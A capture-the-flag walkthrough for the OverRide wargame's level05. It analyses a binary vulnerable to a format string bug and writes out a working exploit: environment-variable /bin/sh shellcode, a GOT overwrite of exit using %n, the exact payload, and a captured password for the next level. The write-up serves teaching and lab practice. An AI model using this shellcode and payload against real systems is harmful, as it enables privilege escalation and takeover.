# Level 05

## GDB Utils

```
(gdb) disas main
Dump of assembler code for function main:
   0x08048444 <+0>:     push   %ebp
   0x08048445 <+1>:     mov    %esp,%ebp
   0x08048447 <+3>:     push   %edi
   0x08048448 <+4>:     push   %ebx
   0x08048449 <+5>:     and    $0xfffffff0,%esp
   0x0804844c <+8>:     sub    $0x90,%esp
   0x08048452 <+14>:    movl   $0x0,0x8c(%esp)
   0x0804845d <+25>:    mov    0x80497f0,%eax
   0x08048462 <+30>:    mov    %eax,0x8(%esp)
   0x08048466 <+34>:    movl   $0x64,0x4(%esp)
   0x0804846e <+42>:    lea    0x28(%esp),%eax
   0x08048472 <+46>:    mov    %eax,(%esp)
   0x08048475 <+49>:    call   0x8048350 <fgets@plt>
   0x0804847a <+54>:    movl   $0x0,0x8c(%esp)
   0x08048485 <+65>:    jmp    0x80484d3 <main+143>
   0x08048487 <+67>:    lea    0x28(%esp),%eax
   0x0804848b <+71>:    add    0x8c(%esp),%eax
   0x08048492 <+78>:    movzbl (%eax),%eax
   0x08048495 <+81>:    cmp    $0x40,%al
   0x08048497 <+83>:    jle    0x80484cb <main+135>
   0x08048499 <+85>:    lea    0x28(%esp),%eax
   0x0804849d <+89>:    add    0x8c(%esp),%eax
   0x080484a4 <+96>:    movzbl (%eax),%eax
   0x080484a7 <+99>:    cmp    $0x5a,%al
   0x080484a9 <+101>:   jg     0x80484cb <main+135>
   0x080484ab <+103>:   lea    0x28(%esp),%eax
   0x080484af <+107>:   add    0x8c(%esp),%eax
   0x080484b6 <+114>:   movzbl (%eax),%eax
   0x080484b9 <+117>:   mov    %eax,%edx
   0x080484bb <+119>:   xor    $0x20,%edx
   0x080484be <+122>:   lea    0x28(%esp),%eax
   0x080484c2 <+126>:   add    0x8c(%esp),%eax
   0x080484c9 <+133>:   mov    %dl,(%eax)
   0x080484cb <+135>:   addl   $0x1,0x8c(%esp)
   0x080484d3 <+143>:   mov    0x8c(%esp),%ebx
   0x080484da <+150>:   lea    0x28(%esp),%eax
   0x080484de <+154>:   movl   $0xffffffff,0x1c(%esp)
   0x080484e6 <+162>:   mov    %eax,%edx
   0x080484e8 <+164>:   mov    $0x0,%eax
   0x080484ed <+169>:   mov    0x1c(%esp),%ecx
   0x080484f1 <+173>:   mov    %edx,%edi
   0x080484f3 <+175>:   repnz scas %es:(%edi),%al
   0x080484f5 <+177>:   mov    %ecx,%eax
   0x080484f7 <+179>:   not    %eax
   0x080484f9 <+181>:   sub    $0x1,%eax
   0x080484fc <+184>:   cmp    %eax,%ebx
   0x080484fe <+186>:   jb     0x8048487 <main+67>
   0x08048500 <+188>:   lea    0x28(%esp),%eax
   0x08048504 <+192>:   mov    %eax,(%esp)
   0x08048507 <+195>:   call   0x8048340 <printf@plt>
   0x0804850c <+200>:   movl   $0x0,(%esp)
   0x08048513 <+207>:   call   0x8048370 <exit@plt>
```

The binary only contains a main.

IDA :

```c
int main(int argc, const char **argv, const char **envp)
{
  int result;
  char v4[100];
  unsigned int i;

  i = 0;
  fgets(v4, 100, stdin);
  for ( i = 0; i < strlen(v4); ++i )
  {
    if ( v4[i] > 64 && v4[i] <= 90 )
      v4[i] ^= 0x20;
  }
  printf(v4);
  exit(0);
  _libc_csu_init();
  return result;
}
```

Lets see what's the binary behavior's.


```sh
level05@OverRide:~$ ./level05
da
da
level05@OverRide:~$ ./level05
heyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyy
heyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyylevel05@OverRide:~$ ./level05
^C
level05@OverRide:~$
level05@OverRide:~$ ./level05
heyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyheyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyheyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyy
heyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyylevel05@OverRide:~$
level05@OverRide:~$
```

So yes the the programs is using fgets() with a limit of 100 byte, to fill a buffer who seems to fit.

The program then use printf to print the buffer, but is vulnerable to a format string attack.

But before the buffer is printed, the content of the buffer is submitted to the OR bitwise operator with the value 32, if the content is between 64 and 90, which is between 'A' and 'Z'.

Before trying to attack the binary with the format string attack lets see what that transformation does.

My translation :

```c
int main(int ac, char **av)
{
        if ( ac != 2)
                return 0;

        for (int i = 0; i < strlen(av[1]); i++)
        {
                if (av[1][i] > 64 && av[1][i] <= 90 )
                        av[1][i] ^= 0x20;
        }
        printf(av[1]);
        return 0;
}
```

Output :

```sh
➜  workspace ./a.out hey
hey
➜  workspace ./a.out HEY
hey
➜  workspace ./a.out LOOOOOOOOOOOL
loooooooooool 
```

So it basically mean the v4 buffer is submitted to a tolower() call.

## Format String Attack

We can basically make an easy format string attack, but there is nothing that's is executing a shell in the program, the only way to do so is by using a shellcode.


So first of all we are going to bring that shellcode to the program using the environnement like so :

```sh
level05@OverRide:~$ export SHELLCODE=$(python -c "print '\x90' * 20 + '\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80'")
```

Then we are going to find where it start in the stack.

```sh
0xffffd870:     0x458493fd      0x4d0d9289      0x69b6f951      0x00363836
0xffffd880:     0x2f000000      0x656d6f68      0x6573752f      0x6c2f7372
0xffffd890:     0x6c657665      0x6c2f3530      0x6c657665      0x53003530
0xffffd8a0:     0x4c4c4548      0x45444f43      0x9090903d      0x90909090
0xffffd8b0: >>> 0x90909090      0x90909090      0x90909090      0x31c03190
0xffffd8c0:     0xcd06b0db      0x2f685380      0x68797474      0x7665642f
0xffffd8d0:     0xc931e389      0x2712b966      0x80cd05b0      0x6850c031
0xffffd8e0:     0x68732f2f      0x69622f68      0x50e3896e      0x99e18953
0xffffd8f0:     0x80cd0bb0      0x45485300      0x2f3d4c4c      0x2f6e6962
0xffffd900:     0x68736162      0x52455400      0x74783d4d      0x2d6d7265
0xffffd910:     0x63363532      0x726f6c6f      0x48535300      0x494c435f
0xffffd920:     0x3d544e45      0x302e3031      0x322e322e      0x38303520
0xffffd930:     0x34203839      0x00323432      0x5f485353      0x3d595454
0xffffd940:     0x7665642f      0x7374702f      0x5500302f      0x3d524553
0xffffd950:     0x6576656c      0x0035306c      0x435f534c      0x524f4c4f
0xffffd960:     0x73723d53      0x643a303d      0x31303d69      0x3a34333b
0xffffd970:     0x303d6e6c      0x36333b31      0x3d686d3a      0x703a3030
0xffffd980:     0x30343d69      0x3a33333b      0x303d6f73      0x35333b31
0xffffd990:     0x3d6f643a      0x333b3130      0x64623a35      0x3b30343d
0xffffd9a0:     0x303b3333      0x64633a31      0x3b30343d      0x303b3333
0xffffd9b0:     0x726f3a31      0x3b30343d      0x303b3133      0x75733a31
0xffffd9c0:     0x3b37333d      0x733a3134      0x30333d67      0x3a33343b
0xffffd9d0:     0x333d6163      0x31343b30      0x3d77743a      0x343b3033
(gdb)
```

Our NOP's start at 0xffffd8b0.

The next instruction after the vulnerable printf is an exit(), so we are going to write his GOT's address


```sh
level05@OverRide:~$ objdump -R ./level05                                                                                                                                                    
./level05:     file format elf32-i386

DYNAMIC RELOCATION RECORDS
OFFSET   TYPE              VALUE
080497c4 R_386_GLOB_DAT    __gmon_start__
080497f0 R_386_COPY        stdin
080497d4 R_386_JUMP_SLOT   printf
080497d8 R_386_JUMP_SLOT   fgets
080497dc R_386_JUMP_SLOT   __gmon_start__
080497e0 R_386_JUMP_SLOT   exit <<<<<<<<<<<<<<<
080497e4 R_386_JUMP_SLOT   __libc_start_main
```

The address to overwrite is 0x080497e0, with 0xffffd8b0.


But 0xffffd8b0 in decimal is equal to 4294957232.

Which is impossible to print, so we must write it in 2 times.

We are going to write 0xd8b0 at 0x080497e0.

And 0xffff at 0x080497e2 (2 byte far)

The final exploit will look like this :

```sh
python -c "print '\xe0\x97\x04\x08' + '\xe2\x97\x04\x08' + '%55464x' + '%10\$n' '%10063x' + '%11\$n'"
```

We are writting the 2 address to overwrite, then we write 0xd8b0 - 8 (Because of the 2 address we already wrote) in decimal, we then points to the first address and use %n to write.

We must now write 65535 but we already wrote 55464, so we are going to write 65535 - (55464 - 8) = 10063, and then points to the second address.

We test it :

```sh
$ id
uid=1005(level05) gid=1005(level05) euid=1006(level06) egid=100(users) groups=1006(level06),100(users),1005(level05)
$ cat /home/users/level06/.pass
h4GtNnaMs2kZFN92ymTr2DcJHAzMfzLW25Ep59mq
$
```
And it worked !